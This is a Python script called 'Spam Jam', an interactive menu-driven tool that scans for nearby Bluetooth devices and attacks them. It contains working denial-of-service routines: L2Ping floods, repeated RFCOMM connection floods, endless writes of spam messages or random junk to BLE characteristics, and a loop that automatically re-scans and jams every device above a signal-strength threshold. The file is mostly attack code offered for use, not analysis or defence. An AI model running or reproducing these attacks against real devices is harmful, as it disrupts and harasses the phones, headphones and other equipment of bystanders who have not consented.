import os
import sys
import time
import random
import subprocess
from bluepy.btle import Scanner, Peripheral, DefaultDelegate, ADDR_TYPE_RANDOM, ADDR_TYPE_PUBLIC, BTLEException

# 🎨 Spam Jam Banner
def print_banner():
    print(r"""
███████╗██████╗  █████╗ ███╗   ███╗         ██╗ █████╗ ███╗   ███╗
██╔════╝██╔══██╗██╔══██╗████╗ ████║         ██║██╔══██╗████╗ ████║
███████╗██████╔╝███████║██╔████╔██║         ██║███████║██╔████╔██║
╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    ██   ██║██╔══██║██║╚██╔╝██║
███████║██║     ██║  ██║██║ ╚═╝ ██║    ╚█████╔╝██║  ██║██║ ╚═╝ ██║
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝ 
   ❤️💜 A WORLD OF BLE FUN 💜❤️
   👩‍💻 Author: ekoms savior
   🎯 Now with MORE Custom Attacks! 🎉
   """)
    print("💜 XOXO HACK THE PLANET! 💜\n")

# 🎯 BLE Spamming Class
class BLESpam(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleNotification(self, cHandle, data):
        print(f"🔔 Notification from BLE device: {data}")

# 🔎 Interactive BLE Scanner
def interactive_ble_scan():
    print("🔎 Scanning for BLE devices nearby...")
    scanner = Scanner()
    try:
        devices = scanner.scan(10.0)
        if not devices:
            print("⚠️ No BLE devices found.")
            return []
        for idx, dev in enumerate(devices):
            print(f"🔹 {idx}: {dev.addr} ({dev.addrType}), RSSI={dev.rssi} dB")
        return devices
    except BTLEException as e:
        print(f"⚠️ Scan failed: {e}")
        return []

# 🔎 Classic Bluetooth Scan with Cute Output + Selection
def scan_classic_devices():
    print("🤖 Scanning for Classic Bluetooth devices...")
    try:
        output = subprocess.check_output(["hcitool", "scan"], stderr=subprocess.DEVNULL).decode()
        lines = output.split("\n")[1:]  # Skip the first header line
        results = []
        for idx, line in enumerate(lines):
            parts = line.strip().split("\t")
            if len(parts) >= 2:
                mac = parts[0]
                name = parts[-1]
                print(f"🔹 {idx}: {mac} — {name}")
                results.append((mac, name))
        return results
    except Exception as e:
        print(f"⚠️ Classic scan failed: {e}")
        return []

# 🎯 Classic RFCOMM Flood Targeted by Scan
def classic_jam():
    devices = scan_classic_devices()
    if not devices:
        return
    try:
        idx = int(input("💜 Enter index of classic device to RFCOMM flood: "))
        target_mac = devices[idx][0]
    except (ValueError, IndexError):
        print("⚠️ Invalid selection.")
        return

    print(f"💥 Starting classic RFCOMM flood on {target_mac}...")
    for i in range(1000):
        try:
            subprocess.run(["rfcomm", "connect", target_mac, "1"], check=True)
            print(f"✅ Attempt {i+1}: Connected to {target_mac}")
        except subprocess.CalledProcessError:
            print(f"⚠️ Attempt {i+1}: Failed to connect to {target_mac}")

# 💥 L2Ping Flood
def l2ping_attack():
    devices = interactive_ble_scan()
    if not devices:
        return
    try:
        idx = int(input("💜 Enter index of device to L2Ping: "))
        addr = devices[idx].addr
    except (ValueError, IndexError):
        print("⚠️ Invalid selection.")
        return

    if os.geteuid() != 0:
        print("⚠️ L2Ping needs root! Try: sudo python3 spam_jam.py")
        return

    print(f"💥 Sending L2Ping flood to {addr}")
    try:
        subprocess.run(['l2ping', '-c', '100', '-s', '600', addr], check=True)
        print("✅ L2Ping attack successful!")
    except subprocess.CalledProcessError:
        print(f"⚠️ Failed. Device may be offline.")

# ✅ RFCOMM Flood
def rfcomm_flood():
    devices = interactive_ble_scan()
    if not devices:
        return
    try:
        idx = int(input("💜 Enter index of device for RFCOMM Flood: "))
        addr = devices[idx].addr
    except (ValueError, IndexError):
        print("⚠️ Invalid selection.")
        return

    print(f"💥 Starting RFCOMM flood on {addr}...")
    for i in range(1000):
        try:
            subprocess.run(['rfcomm', 'connect', addr, '1'], check=True)
            print(f"✅ Attempt {i+1}: Connected")
        except subprocess.CalledProcessError:
            print(f"⚠️ Attempt {i+1}: Failed")

# 🚀 Spam Single BLE Device
def spam_ble():
    devices = interactive_ble_scan()
    if not devices:
        return
    try:
        idx = int(input("💜 Enter index of device to spam: "))
        target_mac = devices[idx].addr
    except (ValueError, IndexError):
        print("⚠️ Invalid index.")
        return

    print(f"🚀 Spamming device {target_mac} 💥💜")
    custom_message = input("💜 Enter your custom spam message: ").encode()

    try:
        print("🔎 Attempting connection with RANDOM address type...")
        peripheral = Peripheral(target_mac, ADDR_TYPE_RANDOM)
    except BTLEException:
        print("⚠️ RANDOM address type failed! Trying PUBLIC address type...")
        try:
            peripheral = Peripheral(target_mac, ADDR_TYPE_PUBLIC)
        except BTLEException as e:
            print(f"❌ Failed to connect to {target_mac}. Error: {e}")
            return

    peripheral.setDelegate(BLESpam())
    while True:
        try:
            peripheral.writeCharacteristic(0x0001, custom_message)
            print(f"💜 Spammed: {custom_message.decode(errors='ignore')}")
            time.sleep(0.5)
        except Exception as e:
            print(f"⚠️ Error: {e}")
            break

# 🚀 Spam All BLE Devices
def spam_all_ble():
    devices = interactive_ble_scan()
    if not devices:
        return

    custom_message = input("💜 Enter your spam message for all devices: ").encode()
    for device in devices:
        try:
            print(f"🚀 Trying to spam {device.addr} 💌")
            peripheral = Peripheral(device.addr, ADDR_TYPE_RANDOM)
            peripheral.setDelegate(BLESpam())
            peripheral.writeCharacteristic(0x0001, custom_message)
            print(f"💜 Spammed {device.addr}")
            peripheral.disconnect()
        except Exception as e:
            print(f"⚠️ Could not spam {device.addr}: {e}")

# 🚫 Jam Single BLE Device
def jam_ble():
    print("🔎 Resetting BLE scan before jamming...")
    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    scanner = Scanner()
    try:
        devices = scanner.scan(15.0)
    except BTLEException as e:
        print(f"⚠️ BLE Scan Failed: {e}")
        return

    if not devices:
        print("⚠️ No devices found!")
        return

    for idx, device in enumerate(devices):
        print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")

    try:
        idx = int(input("💜 Enter index of device to jam: "))
        target = devices[idx].addr
    except (ValueError, IndexError):
        print("⚠️ Invalid choice.")
        return

    print(f"💥 Jamming {target} 🚫")
    try:
        peripheral = Peripheral(target)
        while True:
            junk = os.urandom(random.randint(20, 50))
            peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
            print(f"🚫 Jammed {target}")
            time.sleep(random.uniform(0.05, 0.2))
    except Exception as e:
        print(f"⚠️ Error: {e}")
        retry = input("💜 Try another? (y/n): ").strip().lower()
        if retry == 'y':
            jam_ble()

# 🚫 Jam All BLE Devices — AUTO RE-SCAN + RSSI + CLASSIC SCAN
def jam_all_ble():
    print("🔎 Starting auto-rejam loop 📡")
    try:
        min_rssi = int(input("💜 Enter minimum RSSI to jam (e.g. -80): "))
    except ValueError:
        min_rssi = -80
        print("⚠️ Invalid input! Defaulting to -80 dB.")

    try:
        while True:
            print("\n🔁 Scanning for BLE devices to jam...")
            scanner = Scanner()
            try:
                devices = scanner.scan(15.0)
            except BTLEException as e:
                print(f"⚠️ BLE Scan failed: {e}")
                continue

            print("🔍 Detected BLE devices:")
            for dev in devices:
                print(f"  • {dev.addr} RSSI={dev.rssi} dB")

            jam_targets = [dev for dev in devices if dev.rssi >= min_rssi]

            if not jam_targets:
                print("⚠️ No targets found above threshold. Retrying...")
            else:
                for device in jam_targets:
                    try:
                        print(f"💥 Jamming {device.addr} (RSSI={device.rssi} dB)")
                        peripheral = Peripheral(device.addr)
                        junk = os.urandom(random.randint(20, 50))
                        peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
                        peripheral.disconnect()
                        time.sleep(random.uniform(0.05, 0.2))
                    except Exception as e:
                        print(f"⚠️ Skipped {device.addr}: {e}")

            print("🔁 Waiting 5 seconds before next scan...")
            time.sleep(5)

            print("🤖 Also checking for classic Bluetooth devices...")
            subprocess.run(["hcitool", "scan"])

    except KeyboardInterrupt:
        print("\n🛑 Auto re-jam stopped by user.")

# 🔎 Bluetooth Scanner
def scan_bluetooth():
    print("🔎 Scanning for Bluetooth devices...")
    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        scanner = Scanner()
        devices = scanner.scan(10.0)
        if not devices:
            print("⚠️ No Bluetooth devices found.")
            return
        for idx, d in enumerate(devices):
            print(f"🔹 {idx}: {d.addr} ({d.addrType}), RSSI={d.rssi} dB")
    except BTLEException as e:
        print(f"⚠️ Scan failed: {e}")

# 🧠 Start Bluetooth Service
def start_bluetooth():
    print("📡 Starting Bluetooth service...")
    subprocess.run(['sudo', 'service', 'bluetooth', 'start'], check=True)
    print("✅ Bluetooth service started!")

# 🏁 Main Menu
def main():
    print_banner()
    while True:
        print("\n🔹 1️⃣ Spam a BLE device 💌")
        print("🔹 2️⃣ Jam a BLE device 🚫")
        print("🔹 3️⃣ Scan for Bluetooth devices 📡")
        print("🔹 4️⃣ L2Ping Attack 💥")
        print("🔹 5️⃣ RFCOMM Flood 💥")
        print("🔹 6️⃣ Start Bluetooth Service 📡")
        print("🔹 7️⃣ Quit 🚪")
        print("🔹 8️⃣ Spam All BLE Devices 💌💥")
        print("🔹 9️⃣ Jam All BLE Devices 🚫💥")
        print("🔹 🔟 Classic RFCOMM Jam 💣")

        choice = input("💜 Choose an option (1-10): ")
        functions = [spam_ble, jam_ble, scan_bluetooth, l2ping_attack, rfcomm_flood, start_bluetooth, None, spam_all_ble, jam_all_ble, classic_jam]

        if choice == "7":
            print("👋 Goodbye, fren! XOXOXO 💜")
            sys.exit()
        elif choice in map(str, range(1, 11)):
            func = functions[int(choice)-1]
            if func:
                func()
        else:
            print("⚠️ Invalid choice. Try again! 💜")

if __name__ == "__main__":
    main()
